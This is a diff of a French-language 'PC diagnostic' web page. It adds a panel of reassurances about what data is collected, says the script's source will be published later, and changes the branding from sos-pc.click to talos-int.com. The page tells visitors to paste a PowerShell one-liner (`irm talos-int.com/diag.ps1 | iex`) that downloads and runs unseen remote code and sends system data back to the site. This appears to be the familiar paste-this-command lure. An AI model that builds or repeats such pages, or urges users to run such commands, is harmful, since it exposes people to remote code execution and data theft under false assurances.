@@ -17,16 +17,52 @@
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
         Aucun fichier personnel collecté — uniquement les données techniques système.
       </div>
+      <details class="diag-disclosure">
+        <summary>
+          <span class="dd-arrow mono">▸</span>
+          <span class="dd-label mono">Que collecte exactement le script ?</span>
+        </summary>
+        <div class="dd-body">
+          <div class="dd-col dd-col--ok">
+            <p class="dd-h mono">COLLECTÉ</p>
+            <ul>
+              <li><span class="mono ok">✓</span> Modèle CPU, RAM, GPU</li>
+              <li><span class="mono ok">✓</span> État disques (SMART, espace libre)</li>
+              <li><span class="mono ok">✓</span> Version Windows et mises à jour</li>
+              <li><span class="mono ok">✓</span> Erreurs système (7 derniers jours)</li>
+              <li><span class="mono ok">✓</span> Logiciels installés (nom, version)</li>
+              <li><span class="mono ok">✓</span> État antivirus / pare-feu</li>
+              <li><span class="mono ok">✓</span> Températures matérielles</li>
+            </ul>
+          </div>
+          <div class="dd-col dd-col--no">
+            <p class="dd-h mono">NON COLLECTÉ</p>
+            <ul>
+              <li><span class="mono err">✗</span> Fichiers personnels</li>
+              <li><span class="mono err">✗</span> Mots de passe</li>
+              <li><span class="mono err">✗</span> Historique de navigation</li>
+              <li><span class="mono err">✗</span> Cookies et sessions</li>
+              <li><span class="mono err">✗</span> Captures d'écran</li>
+              <li><span class="mono err">✗</span> Frappes clavier</li>
+              <li><span class="mono err">✗</span> Données réseau (URL, contenu)</li>
+            </ul>
+          </div>
+        </div>
+        <p class="dd-foot mono">
+          Le script s'exécute une seule fois, ne s'installe pas et ne laisse aucune trace.
+          Le code source sera publié prochainement.
+        </p>
+      </details>
     </div>
     <div class="diag-terminal">
       <div class="terminal-bar">
         <span class="t-dot red"></span>
         <span class="t-dot yellow"></span>
         <span class="t-dot green"></span>
-        <span class="t-title">diagnostic-sos-pc.ps1</span>
+        <span class="t-title">diagnostic-talos-int.ps1</span>
       </div>
       <div class="terminal-body">
-        <div class="t-line"><span class="t-prompt">PS&gt;</span> <span class="t-cmd">$s='XXXX'; irm sos-pc.click/diag.ps1 | iex</span></div>
+        <div class="t-line"><span class="t-prompt">PS&gt;</span> <span class="t-cmd">$s='XXXX'; irm talos-int.com/diag.ps1 | iex</span></div>
         <div class="t-output">Collecte des informations système...</div>
         <div class="t-output t-list">
           <span class="t-item ok">✓ OS Windows 11 Pro</span>
@@ -35,8 +71,8 @@
           <span class="t-item warn">⚠ Disque C: 94% utilisé</span>
           <span class="t-item err">✗ 3 erreurs critiques détectées</span>
         </div>
-        <div class="t-output teal">Envoi des données vers SOS-PC...</div>
-        <div class="t-output" style="color:#00d4aa;font-weight:600">✓ Retournez sur sos-pc.click !</div>
+        <div class="t-output teal">Envoi des données vers Talos Int…</div>
+        <div class="t-output" style="color:#00d4aa;font-weight:600">✓ Retournez sur talos-int.com !</div>
       </div>
       <div class="diag-cta-box">
         <p class="mono" style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">
@@ -107,6 +143,120 @@
     border: 1px solid rgba(0, 212, 170, 0.15);
     border-radius: var(--radius);
     padding: 8px 12px;
+  }
+
+  .diag-disclosure {
+    margin-top: 12px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+
+  .diag-disclosure[open] {
+    border-color: rgba(0, 212, 170, 0.35);
+  }
+
+  .diag-disclosure summary {
+    list-style: none;
+    cursor: pointer;
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    color: var(--text-muted);
+    transition: background 0.2s, color 0.2s;
+    user-select: none;
+  }
+
+  .diag-disclosure summary::-webkit-details-marker {
+    display: none;
+  }
+
+  .diag-disclosure summary:hover {
+    background: var(--bg-elevated);
+    color: var(--text);
+  }
+
+  .dd-arrow {
+    color: var(--accent-hex);
+    transition: transform 0.2s ease;
+    display: inline-block;
+  }
+
+  .diag-disclosure[open] .dd-arrow {
+    transform: rotate(90deg);
+  }
+
+  .dd-label {
+    font-size: 12px;
+  }
+
+  .dd-body {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0;
+    padding: 8px 14px 4px;
+    border-top: 1px solid var(--border);
+  }
+
+  .dd-col {
+    padding: 8px 6px;
+  }
+
+  .dd-col + .dd-col {
+    border-left: 1px dashed var(--border);
+    padding-left: 14px;
+  }
+
+  .dd-h {
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    margin-bottom: 8px;
+    padding-bottom: 4px;
+    border-bottom: 1px dashed var(--border);
+  }
+
+  .dd-col--ok .dd-h { color: var(--accent-hex); }
+  .dd-col--no .dd-h { color: var(--red); }
+
+  .dd-col ul {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+
+  .dd-col li {
+    font-size: 12px;
+    color: var(--text-muted);
+    display: flex;
+    gap: 8px;
+    line-height: 1.4;
+  }
+
+  .dd-col .ok { color: var(--accent-hex); flex-shrink: 0; }
+  .dd-col .err { color: var(--red); flex-shrink: 0; }
+
+  .dd-foot {
+    font-size: 11px;
+    color: var(--text-dim);
+    padding: 8px 14px 12px;
+    line-height: 1.5;
+  }
+
+  @media (max-width: 480px) {
+    .dd-body {
+      grid-template-columns: 1fr;
+    }
+    .dd-col + .dd-col {
+      border-left: none;
+      border-top: 1px dashed var(--border);
+      padding-left: 6px;
+      padding-top: 12px;
+      margin-top: 4px;
+    }
   }
 
   .diag-terminal {
